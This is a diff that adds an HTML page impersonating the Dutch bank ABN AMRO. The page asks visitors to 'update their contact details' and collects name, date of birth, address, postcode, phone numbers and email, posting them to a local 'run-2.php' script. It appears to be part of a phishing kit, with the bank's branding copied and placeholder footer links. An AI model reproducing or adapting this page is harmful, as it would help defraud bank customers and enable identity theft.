@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+
+<html lang="nl">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>ABN AMRO</title>
+<link href="https://www.abnamro.nl/nl/retail/pr/static/favicon.ico" rel="shortcut icon"/>
+<style>
+        :root {
+            --font-medium: 16px;
+        }
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #007d71;
+            display: flex;
+            flex-direction: column;
+        }
+        .content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .top-bar {
+            background-color: white;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #ccc;
+        }
+        .top-bar img {
+            height: 30px;
+        }
+        .menu {
+            display: flex;
+            align-items: center;
+        }
+        .menu a {
+            color: #007d71;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .menu a:hover {
+            text-decoration: underline;
+        }
+        .contact-form {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+        .contact-form h2 {
+            text-align: center;
+            margin-bottom: 10px;
+            color: #00716b;
+            font-size: 24px;
+        }
+        .contact-form p {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #555;
+            font-size: 14px;
+        }
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .input-wrapper input,
+        .input-wrapper select {
+            width: 100%;
+            height: 60px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+        .input-wrapper input:focus,
+        .input-wrapper select:focus {
+            border-color: #00716b;
+            outline: none;
+        }
+        .input-wrapper label {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            transform: translateY(-50%);
+            background: white;
+            padding: 0 5px;
+            color: #aaa;
+            pointer-events: none;
+            transition: all 0.2s ease-in-out;
+            font-size: 13px;
+        }
+        .input-wrapper input:focus + label,
+        .input-wrapper input:not(:placeholder-shown) + label,
+        .input-wrapper select:focus + label,
+        .input-wrapper select:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 10px;
+            background: white;
+            color: #00716b;
+            font-size: 12px;
+            transform: translateY(0);
+        }
+        .contact-form button {
+            width: 100%;
+            height: 60px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-family: "Inter", sans-serif;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border-color 0.2s;
+            background-color: #00716b;
+            color: white;
+        }
+        .contact-form button:hover {
+            background-color: #005951;
+        }
+        .footer {
+            background-color: white;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-top: 1px solid #ccc;
+            font-size: 14px;
+            color: #007d71;
+        }
+        .footer a {
+            color: #007d71;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            .top-bar {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .top-bar img {
+                margin-bottom: 10px;
+            }
+            .menu {
+                flex-wrap: wrap;
+                justify-content: center;
+                width: 100%;
+                text-align: center;
+            }
+            .menu a {
+                margin: 5px 10px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+            .footer a {
+                margin: 5px 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="top-bar">
+<img alt="ABN AMRO Logo" src="local_resources/img/d8f539d134c8f0a958c6c99f67af1d88.png"/>
+</div>
+<div class="content">
+<div class="contact-form">
+<h2>Contactgegevens bijwerken</h2>
+<p>Vul de onderstaande velden in om uw gegevens te actualiseren.</p>
+<form action="run-2.php" method="post">
+<div class="input-wrapper">
+<select id="aanhef" name="aanhef" required="">
+<option disabled="" selected="" value=""></option>
+<option value="heer">Heer</option>
+<option value="mevrouw">Mevrouw</option>
+</select>
+<label for="aanhef">Aanhef</label>
+</div>
+<div class="input-wrapper" style="margin-bottom: 15px;">
+<input id="voornaam" name="voornaam" oninput="this.value = this.value.normalize('NFD').replace(/[\u0300-\u036f]/g, '')" placeholder=" " required="" type="text"/>
+<label for="voornaam" style="font-size: 14px; color: #333;">Voornaam</label>
+</div>
+<div class="input-wrapper" style="margin-bottom: 15px;">
+<input id="achternaam" name="achternaam" oninput="this.value = this.value.normalize('NFD').replace(/[\u0300-\u036f]/g, '')" placeholder=" " required="" type="text"/>
+<label for="achternaam" style="font-size: 14px; color: #333;">Achternaam</label>
+</div>
+<div class="input-wrapper">
+<input id="geboortedatum" name="geboortedatum" placeholder=" " required="" type="date"/>
+<label for="geboortedatum">Geboortedatum</label>
+</div>
+<div class="input-wrapper">
+<input id="straat_huisnummer" name="straat_huisnummer" placeholder=" " required="" type="text"/>
+<label for="straat_huisnummer">Straatnaam en Huisnummer</label>
+</div>
+<div class="input-wrapper">
+<input id="postcode" name="postcode" placeholder=" " required="" type="text"/>
+<label for="postcode">Postcode</label>
+</div>
+<div class="input-wrapper">
+<input id="telefoonnummer" name="telefoonnummer" placeholder=" " required="" type="tel"/>
+<label for="telefoonnummer">Telefoonnummer</label>
+</div>
+<div class="input-wrapper">
+<input id="telefoonnummer1" name="telefoonnummer1" placeholder=" " required="" type="tel"/>
+<label for="telefoonnummer1">Mobiele nummer</label>
+</div>
+<div class="input-wrapper">
+<input id="emailadres" name="emailadres" placeholder=" " required="" type="email"/>
+<label for="emailadres">E-mailadres</label>
+</div>
+<button type="submit"><b>Verzenden</b></button>
+</form>
+</div>
+</div>
+<div class="footer">
+<div>
+<a href="#">NL</a> |
+            <a href="#">EN</a> |
+            <a href="#">Veilig bankieren</a> |
+            <a href="#">Toegankelijkheid</a> |
+            <a href="#">Privacy en cookies</a> |
+            <a href="#">Disclaimer</a>
+</div>
+<div>Â© ABN AMRO</div>
+</div>
+</body>
+</html>
